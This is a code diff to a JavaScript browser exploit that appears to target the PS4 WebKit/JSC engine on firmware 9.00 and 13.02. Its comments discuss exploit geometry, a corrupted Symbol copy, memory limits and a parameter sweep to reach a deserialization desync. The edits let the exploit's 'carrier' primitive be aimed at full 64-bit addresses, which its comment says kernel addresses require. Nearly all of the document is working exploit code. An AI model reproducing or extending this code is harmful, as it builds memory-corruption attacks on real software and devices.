@@ -21,12 +21,7 @@
 // On 13.02, every cold boot ends in NORMAL-CLONE-MISS with K=2. Whether
 // that is because the tracking structure is a HashMap (no eviction
 // possible) or because the encoding-width desync hasn't been triggered
-// is the question the K sweep answers:
-//
-//   - If any K != 2 produces "Unable to deserialize data", the desync
-//     mechanism is alive and K is the parameter to tune.
-//   - If every K produces NORMAL-CLONE-MISS, the desync is not reachable
-//     and the SSV path is closed on this firmware.
+// is the question the K sweep answers.
 
 let DRAIN_COUNT = 512;
 const AUTO_RETRY_DELAY_MS = 50;
@@ -63,12 +58,12 @@ const HOLDER_BYTES = 0x40;
 
 // 9.00 copies 924,176 UTF-16 characters from this backing store (~1.85 MB).
 // This capacity is part of the 9.00 JSC exploit geometry, not merely spare
-// storage.  At 9,000,000 slots the corrupted Symbol copy is consistently
-// 924,176 characters.  Reducing it to 2,000,000 changes that copy to a bogus
+// storage. At 9,000,000 slots the corrupted Symbol copy is consistently
+// 924,176 characters. Reducing it to 2,000,000 changes that copy to a bogus
 // 17,701,392 characters and makes the safe retry exhaust the WebProcess.
 //
 // The PS4 browser pool caps at ~84 MB, so this value is close to the
-// ceiling.  Do not raise it without measuring OOM on the target console.
+// ceiling. Do not raise it without measuring OOM on the target console.
 const CARRIER_SLOTS = (function () {
     try {
         const q = new URLSearchParams(location.search).get("slots");
@@ -285,10 +280,28 @@ function readTwiceMatches(destination, source, count) {
     return sameBytes(destination, source, count);
 }
 
+// aimCarrier — accepts either a JS number (only safe below 2^48) or an
+// int64-like object {low, hi}. Kernel addresses MUST use the int64 path:
+// a 64-bit pointer cannot survive round-tripping through a JS double.
 function aimCarrier(candidate, address) {
-    const high = Math.floor(address / 0x100000000);
-    scratchWords[0] = address - high * 0x100000000;
-    scratchWords[1] = high;
+    let lo, hi;
+    if (typeof address === "number") {
+        if (address > 0xffffffffffff) {
+            throw new RangeError(
+                "aimCarrier: 64-bit address passed as number; " +
+                "pass an int64-like {low, hi} instead");
+        }
+        hi = Math.floor(address / 0x100000000);
+        lo = address - hi * 0x100000000;
+    } else if (address && typeof address === "object" &&
+               "low" in address && "hi" in address) {
+        lo = address.low >>> 0;
+        hi = address.hi >>> 0;
+    } else {
+        throw new TypeError("aimCarrier: expected number or {low, hi}");
+    }
+    scratchWords[0] = lo;
+    scratchWords[1] = hi;
     for (let i = 0; i < 8; ++i)
         candidate[0x10 + i] = scratchBytes[i];
 }
@@ -1266,11 +1279,15 @@ function buildCarrier() {
     return {
 
         aim(address) {
-
             if (liveCandidate === null)
                 throw new Error("core.aim: carrier is no longer live");
-            if (!plausibleAddress(address))
-                throw new RangeError(`core.aim: implausible address ${address}`);
+            if (typeof address === "number") {
+                if (!plausibleAddress(address))
+                    throw new RangeError(`core.aim: implausible address ${address}`);
+            } else if (!address || typeof address !== "object" ||
+                       !("low" in address) || !("hi" in address)) {
+                throw new TypeError("core.aim: expected number or {low, hi}");
+            }
             aimCarrier(liveCandidate, address);
         },
         restore() {
